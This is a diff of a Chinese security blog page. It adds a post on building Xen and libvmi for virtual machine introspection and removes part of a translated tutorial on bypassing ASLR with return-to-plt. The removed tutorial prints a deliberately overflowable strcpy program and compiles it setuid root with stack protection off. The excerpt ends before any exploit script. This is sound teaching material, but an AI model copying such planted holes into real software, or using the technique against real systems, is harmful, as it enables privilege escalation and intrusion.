@@ -108,6 +108,109 @@
         
           <section id="main">
   
+    <article id="post-libvmisetup"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/20170102/libvmisetup/">Libvmi setup</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	Posted on <a href="/20170102/libvmisetup/" class="article-date">
+	  <time datetime="2017-01-02T02:54:50.000Z" itemprop="datePublished">一月 2, 2017</time>
+	</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>作者：<a href="http://ytliu.info/blog/2013/08/04/libvmi-setup/" target="_blank" rel="external">ytliu</a><br>编辑：@Tula</p>
+<hr>
+<p><strong>CSysSec注</strong>： 继<a href="http://www.csyssec.org/20170102/libvmiintro/" target="_blank" rel="external">上一篇</a>文章介绍Libvmi后，这篇主要介绍如何搭建Libvmi。作者ytliu，来自上海交通大学PhD,研究方向是虚拟化与系统安全，在顶会CCS，HPCA等发表多篇文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/libvmisetup/" target="_blank" rel="external">Libvmi Setup</a>》</p>
+<hr>
+<blockquote>
+<ul>
+<li>0X01 Xen install</li>
+<li>0X02 Domain 0 install</li>
+<li>0X03 Domain U setup</li>
+<li>0X04 libvmi setup</li>
+</ul>
+</blockquote>
+<hr>
+<p>These days I was busy leanrning and trying one of the famous Virtual Machine Introspection (VMI) framework —— <a href="https://github.com/libvmi/libvmi" target="_blank" rel="external">libvmi</a>, it is a library which provides lots of serviceable APIs for programmer to develop introspection tools.</p>
+<p>As we know, one of the foremost problems of VMI is bridging semantics gap between protected and security VMs, libvmi provides APIs helping you to access the memory of a running virtual machine, more specifically, it provides primatives for accessing this memory using physical or virtual addresses and kernel symbols. I will discuss about that in the coming blog introducing libvmi usage.</p>
+<p>Now it’s the main topic of this blog: how to setup libvmi?</p>
+<p>Since libvmi currently support Xen and KVM, and Xen is my preference, following I will take xen as example platform.</p>
+<h3 id="0X01-Xen-install"><a href="#0X01-Xen-install" class="headerlink" title="0X01 Xen install"></a>0X01 Xen install</h3><p>Before setup libvmi, we need to install Xen first:</p>
+<p>One of the most straight forward way to install xen is using Debian’s aptitude:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo aptitude install xen-linux-system<span class="number">-2.6</span> libc6-xen bridge-utils xen-tools</div></pre></td></tr></table></figure></p>
+<p>However, I cannot compile libvmi successfully in such environment, and after seeking in libvmi’s group solution, I need to compile xen from source code. Before that, I need to uninstall the previous installed xen environment:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$sudo dpkg -l | grep xen</div><div class="line">purge them except Dom0 kernel:</div><div class="line">$ sudo dpkg -P libxenstore3<span class="number">.0</span></div><div class="line">…</div></pre></td></tr></table></figure></p>
+<p>Then download the latest 4.3.0 source tarball from <a href="https://www.xenproject.org" target="_blank" rel="external">xen.org</a> and do the usual:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ make xen</div><div class="line">$ ./configure</div></pre></td></tr></table></figure></p>
+<p>Error: unable to find xgettext, please install xgettext<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo aptitude install gettext</div></pre></td></tr></table></figure></p>
+<p>Error: unable to find as86, please install as86<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo aptitude install bcc</div></pre></td></tr></table></figure></p>
+<p>Error: unable to find iasl, please install iasl<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo aptitude install sail</div></pre></td></tr></table></figure></p>
+<p>Error: unable to find a uuid library<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo aptitude install uuid-dev</div></pre></td></tr></table></figure></p>
+<p>Error: unable to find yawl, please install yajl<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ sudo aptitude install libyajl-dev</div><div class="line">$ sudo aptitude install libpixman<span class="number">-1.</span>dev</div></pre></td></tr></table></figure></p>
+<p>After install all these pre-required library:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ make tools    </div><div class="line">$ make stubdom</div><div class="line">$ sudo make install-xen</div><div class="line">$ sudo make install-tools PYTHON_PREFIX_ARG=</div><div class="line">$ sudo make install-stubdom</div></pre></td></tr></table></figure></p>
+<p>Then Xen is successfully compiled.</p>
+<h3 id="0x02-Domain-0-install"><a href="#0x02-Domain-0-install" class="headerlink" title="0x02 Domain 0 install"></a>0x02 Domain 0 install</h3><p>After xen is installed, we need to compile the domain 0 ourselves.</p>
+<p>I download the latest linux kernel (here is 3.10.3) from <a href="https://www.kernel.org" target="_blank" rel="external">kernel.org</a>, then:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ make menuconfig</div></pre></td></tr></table></figure></p>
+<p>in the menuconfig, I choose the virtualization config options and some required device driver (specifically the SATA and SCSI ones), and then:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ make -j4</div><div class="line">$ make modules</div><div class="line">$ make modules_install</div><div class="line">$ sudo make install</div></pre></td></tr></table></figure></p>
+<p>Then domain 0 is also successfully compiled, and after we use<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ update-grub</div></pre></td></tr></table></figure></p>
+<p>the <code>grub.cfg</code> file in<code>/boot/grub/</code> will traverse the <code>/boot/</code> directory and fill all choiceable Xen and kernel image in the grub config during booting.</p>
+<p>Here I did not create the initrd of the kernel, because I’ve already compiled the essential driver in my kernel.</p>
+<h3 id="0x03-Domain-U-setup"><a href="#0x03-Domain-U-setup" class="headerlink" title="0x03 Domain U setup"></a>0x03 Domain U setup</h3><p>After the above done, we reboot, and enter into the Xen environment we just compiled, and are ready to setup our DomU.</p>
+<p>For our HVM DomU setup, we first need to provide a ISO image for DomU install —— <code>ubuntu.iso</code>, and<code>dd</code> for a 10G image:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ dd <span class="keyword">if</span>=/dev/zero of=ubuntu.img bs=<span class="number">1000</span> count=<span class="number">0</span> seek=$[<span class="number">1000</span>*<span class="number">1000</span>*<span class="number">10</span>]</div></pre></td></tr></table></figure></p>
+<p>Then edit our HVM config file:<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">kernel = "hvmloader"</div><div class="line">builder='hvm'</div><div class="line">memory = 2048</div><div class="line">name = "ubuntu"</div><div class="line">vif = [ 'bridge=xenbr0' ]</div><div class="line">disk = [ 'file:diretory-to-domu/ubuntu.img,hda,w', 'file:diretory-to-domu/ubuntu.iso,hdc:cdrom,r' ]</div><div class="line">sdl=0</div><div class="line">opengl=1</div><div class="line">vnc=1</div><div class="line">vncpasswd=''</div><div class="line">stdvga=0</div><div class="line">serial='pty'</div><div class="line">tsc_mode=0</div></pre></td></tr></table></figure></p>
+<p>Then in the terminal, run following command:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo xm create ubuntu.hvm</div></pre></td></tr></table></figure></p>
+<p>After that, we can connect to our DomU using vnc:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ gvncviewer localhost</div></pre></td></tr></table></figure></p>
+<h3 id="0x04-libvmi-setup"><a href="#0x04-libvmi-setup" class="headerlink" title="0x04 libvmi setup"></a>0x04 libvmi setup</h3><p>After all the above environment is ready, we can now compile our libvmi and try to use some of its examples:</p>
+<p>We first download the source code from <a href="https://github.com/libvmi/libvmi" target="_blank" rel="external">here</a>, and <code>cd</code> enter it,<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./autogen.sh</div></pre></td></tr></table></figure></p>
+<p>Error: could not find libtoolize or glibtoolize<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo aptitude install libtool</div></pre></td></tr></table></figure></p>
+<p>Error: aclocal not found<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo aptitude install automake autoconf</div></pre></td></tr></table></figure></p>
+<p>Then:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./configure</div></pre></td></tr></table></figure></p>
+<p>Error: Package requirements (glib-2.0 &gt;= 2.16) were not met<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo aptitude install libglib2<span class="number">.0</span>-dev</div></pre></td></tr></table></figure></p>
+<p>Error: Package requirements (check &gt;= 0.9.4) are not met:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo aptitude install check</div></pre></td></tr></table></figure></p>
+<p>Then:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ make</div><div class="line">$ sudo ldconfig</div><div class="line">$ <span class="function">sudo make <span class="title">install</span>  <span class="params">(optional)</span></span></div></pre></td></tr></table></figure></p>
+<p>Actually, after we successfully <code>make</code>, we can already use it. Before that, we firstly need to provide a config file: <code>/etc/libvmi.conf</code>:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">ubuntu &#123;</div><div class="line">    sysmap      = <span class="string">"directory-to-sysmap/System.map-3.5.0-23-generic"</span>;</div><div class="line">    ostype      = <span class="string">"Linux"</span>;</div><div class="line">    linux_tasks = <span class="number">0x240</span>;</div><div class="line">    linux_name  = <span class="number">0x460</span>;</div><div class="line">    linux_mm    = <span class="number">0x278</span>;</div><div class="line">    linux_pid   = <span class="number">0x2b4</span>;</div><div class="line">    linux_pgd   = <span class="number">0x48</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>These options are:</p>
+<p><figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/Libvmi%20Setup.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/Libvmi%20Setup.png" width="450"></a><br>    <figcaption></figcaption><br></figure><br>Also, libvmi provide a tool in <code>libvmi/tools/linux-offset-finder/</code>, you can copy this directory to the DomU, compile it, and then:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo insmod findoffsets.ko</div></pre></td></tr></table></figure></p>
+<p>then, look the log of the system:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ dmesg</div></pre></td></tr></table></figure></p>
+<p>to get these offsets automatically.</p>
+<p>Meanwhile, libvmi provide some straight forward examples, like<code>process-list</code>, <code>dump-memory</code>, etc., and we can use them (process-list as example):<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo ./examples/process-<span class="built_in">list</span> ubuntu</div></pre></td></tr></table></figure></p>
+<p>Here <code>ubuntu</code>means the name of the DomU, the same as shown when we run:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo xm <span class="built_in">list</span></div></pre></td></tr></table></figure></p>
+<p>Then it will list all of the processes running in the ubuntu DomU.</p>
+<hr>
+<p>Other usages of libvmi, as well as how to write our own introspection tools is introduced <a href="http://ytliu.info/blog/2013/08/14/write-introspection-tools-using-libvmi/" target="_blank" rel="external">here</a>.</p>
+<hr>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/libvmisetup/" target="_blank" rel="external">Libvmi Setup</a>》</p>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+	<span class="ico-folder"></span>
+    <a class="article-category-link" href="/categories/虚拟机监控/">虚拟机监控</a>
+
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Introspection/">Introspection</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Libvmi/">Libvmi</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Virtualization/">Virtualization</a></li></ul>
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
     <article id="post-libvmiintro"  class="article article-type-post" itemscope itemprop="blogPost" >
   <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
     
@@ -442,129 +545,6 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
 <!-- Table of Contents -->
 
   
-    <article id="post-bypassaslr-returntoplt"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/20170101/bypassaslr-returntoplt/">绕过ASLR-第一篇章(return-to-plt)</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	Posted on <a href="/20170101/bypassaslr-returntoplt/" class="article-date">
-	  <time datetime="2017-01-01T03:40:21.000Z" itemprop="datePublished">一月 1, 2017</time>
-	</a>
-
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>作者: <a href="http://www.csyssec.org/about" target="_blank" rel="external">CSysSec出品</a></p>
-<hr>
-<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在<a href="https://github.com/sploitfun/lsploits" target="_blank" rel="external">这里</a>找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170101/bypassaslr-returntoplt" target="_blank" rel="external">Linux(X86)漏洞利用系列-绕过ASLR-第一篇章(return-to-plt)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
-<hr>
-<blockquote>
-<ul>
-<li>0x01 ASLR</li>
-<li>0x02 Return-to-plt</li>
-<li>0x03 调用‘function@PLT’</li>
-</ul>
-</blockquote>
-<p><u>阅读基础</u>:<br>    <a href="http://www.csyssec.org/20161230/stackbufferflow" target="_blank" rel="external">经典栈缓冲区溢出</a><br><u>VM Setup</u>: Ubuntu 12.04(x86)</p>
-<p>在前面的文章中，为了利用漏洞代码，攻击者需要知道：</p>
-<ul>
-<li>栈地址（为了跳转到shellcode中)</li>
-<li>libc基地址(为了成功绕过NX)</li>
-</ul>
-<p>因此，为了防御攻击者的行为，安全研究人员提出一种漏洞利用缓解(exploit mitigation)方法: “ASLR”</p>
-<h3 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h3><p>地址空间布局随机化(ASLR)是一种漏洞利用缓解方法，其可以随机化</p>
-<ul>
-<li>栈地址</li>
-<li>堆地址</li>
-<li>共享库地址</li>
-</ul>
-<p>上述地址一旦被随机化，尤其是当共享库地址被随机化时，由于攻击者需要知道libc的基地址，我们前面提到的绕过NX的方法不再有效。但这种缓解技术也不是完全安全的。</p>
-<p>从<a href="">前文</a>中，我们已经知道exp.py中的 libc函数地址是以下面计算方式得到的：</p>
-<pre><code>libc函数地址=libc基地址+函数偏移
-</code></pre><p>这里</p>
-<ul>
-<li>由于随机化被关闭，libc基地址是个常量(在‘vuln’二进制文件中是0xb7e22000)</li>
-<li>函数偏移也是常量(可以执行”readelf -s libc.so.6 | grep”获取)</li>
-</ul>
-<p>现在当我们利用以下命令打开全随机化选项时(full randomization)</p>
-<pre><code>#echo 2 &gt; /proc/sys/kernel/randomize_va_space
-</code></pre><p>libc基地址将会被随机化</p>
-<p><u>注意</u>： 只有libc的基地址被随机化了，从基地址开始的一个特殊函数的偏移仍然是个常量！因此，尽管打开了ASLR,只要我们能利用下面三项技术绕过共享库基地址的随机化，漏洞程序仍然能被成功利用.</p>
-<ul>
-<li>Return-to-plt（<a href="http://www.csyssec.org/20170101/bypassaslr-returntoplt" target="_blank" rel="external">这篇文章</a>）</li>
-<li>暴力破解(<a href="http://www.csyssec.org/20170101/bypassaslr-bruteforce" target="_blank" rel="external">第二篇章</a>)</li>
-<li>GOT覆盖与GOR解引用(<a href="http://www.csyssec.org/20170101/bypassaslr-gotgor" target="_blank" rel="external">第三篇章</a>)</li>
-</ul>
-<h3 id="Return-to-plt"><a href="#Return-to-plt" class="headerlink" title="Return-to-plt"></a>Return-to-plt</h3><p>利用这项技术，攻击者返回到一个函数的PLT(其地址没有被随机化-在执行之前就可以知道)，而不是返回到libc函数(其地址被随机化了)。 由于’function@PLT’没有被随机化，攻击者不需要预测libc的基地址，而只要简单地返回到‘function@PLT’就可以调用这个’function’。</p>
-<pre><code>什么是PLT,如何调用‘function@PLT&apos;来调用其中的&apos;function&apos;
-</code></pre><h3 id="调用‘function-PLT’"><a href="#调用‘function-PLT’" class="headerlink" title="调用‘function@PLT’"></a>调用‘function@PLT’</h3><p>要了解过程链接表（Procedural Linkage Table(PLT)）,先来简单介绍一下共享库！</p>
-<p>不同于静态库的是，共享库的text段在多个进程间共享，但它的数据段在每个进程中是唯一的。这样设计可以减少内存和磁盘空间。正是text段在多个进程间共享，其必须只有读和执行权限。没有了写权限，动态链接器不能在text段内部重定位数据描述符(data symbol)或者函数地址。这样一来，程序运行期间，动态链接器是如何在不修改text段的情况下，重定位共享库描述符的呢? 利用PIC!</p>
-<pre><code>什么是PIC呢？
-</code></pre><p>位置独立代码(Position Independent Code(PIC))用来解决这个问题： 尽管共享库的text段在加载期间执行重定为，也能确保它能在多个进程中共享。PIC通过一层间接寻址来达到这个目的。共享库的text段中没有绝对虚拟地址来替代全局描述符和函数引用，而是指向数据段中的一个特定表。这个表用来存放全局描述符和函数的绝对虚拟地址。动态链接器作为重定位的一部分会填充这个表。因此，在重定位时，只有数据段被修改，而text段依然完好无顺。</p>
-<p>动态链接器使用下面两种方法来重定位PIC中的全局描述符和函数：</p>
-<ul>
-<li><u>全局偏移表(Global Offset Table(GOT))</u>: 全局偏移表为每个全局变量分配一个4字节的表项，这4个字表项中含有全局变量的地址。当代码段中的一条指令引用一个全局变量时，这条指令指向的是GOT中的一个表项，而不是全局变量的绝对虚拟地址。当共享库被加载时，动态链接库会重定位这个GOT表项。因此，PIC利用GOT通过一层间接寻址来重定位全局描述符.</li>
-<li><u>过程链接表(Procedural Linkage Table(PLT)): 过程链接表含有每个全局函数的存根代码。text段中的一条call指令不会直接调用这个函数(‘function’)，而是调用这个存根代码(function@PLT)。存根代码在动态链接器的帮助下，解析函数地址并将其拷贝到GOT(GOT[n])中。解析过程只发生在第一次调用函数(‘function’)的时候,之后代码段中的call指令调用存根代码(function@PLT)而不是调用动态链接器去解析函数地址(‘function’)。存根代码直接从GOT(GOT[n])获取函数地址并跳转到那里。因此，PIC利用PLT通过两层间接寻址来重定位函数地址</u></li>
-</ul>
-<p>很高兴你知道了PIC并能理解它能保证共享库的text段的完整性，因此能帮助共享库的text段再许多进程间共享！ 但你是否怀疑过，为什么可执行文件的text段并不在任何进程间共享，也需要有个GOT表项或者PLT存根代码呢？这是出于安全保护机制的考虑。如今默认情况下，text段只提供读和执行权限并没有写权限(R_X)。这种保护机制并允许动态链接库对text段进行写操作，因此也就不能重定位text段内部的数据描述符或函数地址。为了让动态链接器能重定位，可执行文件同共享库一样也需要GOT表项和PLT存根代码。</p>
-<p><u>代码样例</u>：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//eg.c</span></div><div class="line"><span class="comment">//$gcc -g -o eg eg.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line"> <span class="built_in">printf</span>(<span class="string">"Hello %s\n"</span>, argv[<span class="number">1</span>]);</div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>下面的汇编代码说明了’printf’并不是直接被调用，而是其相应的PLT代码 ‘printf@PLT’被调用了。</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">(gdb) disassemble main</div><div class="line">Dump of assembler code <span class="keyword">for</span> function main:</div><div class="line"> <span class="number">0x080483e4</span> &lt;+<span class="number">0</span>&gt;: push %ebp</div><div class="line"> <span class="number">0x080483e5</span> &lt;+<span class="number">1</span>&gt;: mov %esp,%ebp</div><div class="line"> <span class="number">0x080483e7</span> &lt;+<span class="number">3</span>&gt;: and $<span class="number">0xfffffff0</span>,%esp</div><div class="line"> <span class="number">0x080483ea</span> &lt;+<span class="number">6</span>&gt;: sub $<span class="number">0x10</span>,%esp</div><div class="line"> <span class="number">0x080483ed</span> &lt;+<span class="number">9</span>&gt;: mov <span class="number">0xc</span>(%ebp),%eax</div><div class="line"> <span class="number">0x080483f0</span> &lt;+<span class="number">12</span>&gt;: add $<span class="number">0x4</span>,%eax</div><div class="line"> <span class="number">0x080483f3</span> &lt;+<span class="number">15</span>&gt;: mov (%eax),%edx</div><div class="line"> <span class="number">0x080483f5</span> &lt;+<span class="number">17</span>&gt;: mov $<span class="number">0x80484e0</span>,%eax</div><div class="line"> <span class="number">0x080483fa</span> &lt;+<span class="number">22</span>&gt;: mov %edx,<span class="number">0x4</span>(%esp)</div><div class="line"> <span class="number">0x080483fe</span> &lt;+<span class="number">26</span>&gt;: mov %eax,(%esp)</div><div class="line"> <span class="number">0x08048401</span> &lt;+<span class="number">29</span>&gt;: call <span class="number">0x8048300</span> &lt;<span class="built_in">printf</span>@plt&gt;</div><div class="line"> <span class="number">0x08048406</span> &lt;+<span class="number">34</span>&gt;: mov $<span class="number">0x0</span>,%eax</div><div class="line"> <span class="number">0x0804840b</span> &lt;+<span class="number">39</span>&gt;: leave </div><div class="line"> <span class="number">0x0804840c</span> &lt;+<span class="number">40</span>&gt;: ret </div><div class="line">End of assembler dump.</div><div class="line">(gdb) disassemble <span class="number">0x8048300</span></div><div class="line">Dump of assembler code <span class="keyword">for</span> function <span class="built_in">printf</span>@plt:</div><div class="line"> <span class="number">0x08048300</span> &lt;+<span class="number">0</span>&gt;: jmp *<span class="number">0x804a000</span></div><div class="line"> <span class="number">0x08048306</span> &lt;+<span class="number">6</span>&gt;: push $<span class="number">0x0</span></div><div class="line"> <span class="number">0x0804830b</span> &lt;+<span class="number">11</span>&gt;: jmp <span class="number">0x80482f0</span></div><div class="line">End of assembler dump.</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
-<p>在’printf’第一次被调用前，其相应的GOT表项(0x804a000)指回到PLT代码(0x8048306)本身。因此，当printf函数第一次被调用时，其相应的函数地址通过动态链接器来解析。</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">(gdb) x/<span class="number">1</span>xw <span class="number">0x804a000</span></div><div class="line"><span class="number">0x804a000</span> &lt;<span class="built_in">printf</span>@got.plt&gt;: <span class="number">0x08048306</span></div><div class="line">(gdb)</div></pre></td></tr></table></figure>
-<p>现在printf被调用之后，其相应的GOT表项含有printf的函数地址(如下图):</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">(gdb) x/<span class="number">1</span>xw <span class="number">0x804a000</span></div><div class="line"><span class="number">0x804a000</span> &lt;<span class="built_in">printf</span>@got.plt&gt;: <span class="number">0xb7e6e850</span></div><div class="line">(gdb)</div></pre></td></tr></table></figure>
-<p><u>注意 1</u>: 如果你想了解PLT和GOT的更多信息，可以阅读<a href="">这篇</a>文章</p>
-<p><u>注意 2</u>: 我会在别的文中单独谈谈动态链接器是如何解析libc函数地址的。现在只要记住下面两条语句(printf@PLT的一部分）是用来解析函数地址的！</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="number">0x08048306</span> &lt;+<span class="number">6</span>&gt;: push $<span class="number">0x0</span></div><div class="line"><span class="number">0x0804830b</span> &lt;+<span class="number">11</span>&gt;: jmp <span class="number">0x80482f0</span></div></pre></td></tr></table></figure>
-<p>了解这个之后，我们可以知道攻击者并不需要知道libc函数的地址来调用libc函数，只要简单通过’function@PLT’（在执行前知道）就可以调用了。</p>
-<p><u>漏洞代码</u>:</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="comment">/* Eventhough shell() function isnt invoked directly, its needed here since 'system@PLT' and 'exit@PLT' stub code should be present in executable to successfully exploit it. */</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span> </span>&#123;</div><div class="line"> system(<span class="string">"/bin/sh"</span>);</div><div class="line"> <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line"> <span class="keyword">int</span> i=<span class="number">0</span>;</div><div class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>];</div><div class="line"> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</div><div class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,buf);</div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p><u>编译命令</u>:</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#echo 2 &gt; /proc/sys/kernel/randomize_va_space</span></div><div class="line">$gcc -g -fno-<span class="built_in">stack</span>-protector -o vuln vuln.c</div><div class="line">$sudo chown root vuln</div><div class="line">$sudo chgrp root vuln</div><div class="line">$sudo chmod +s vuln</div></pre></td></tr></table></figure>
-<p>现在反汇编可执行文件’vuln’,我们可以找出’system@PLT’与’exit@PLT’的地址</p>
